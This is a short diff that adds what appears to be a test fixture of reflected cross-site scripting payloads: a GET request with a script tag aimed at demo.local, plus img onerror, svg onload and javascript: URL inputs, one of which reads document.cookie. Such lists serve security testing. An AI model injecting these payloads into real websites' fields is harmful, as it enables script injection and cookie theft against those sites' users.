@@ -1,0 +1,7 @@
+GET /search?q=<script>alert(1)</script> HTTP/1.1
+Host: demo.local
+
+# Reflected XSS attempts
+comment=<img src=x onerror="alert('xss')">
+bio=<svg onload=alert(1)>
+ref=javascript:alert(document.cookie)
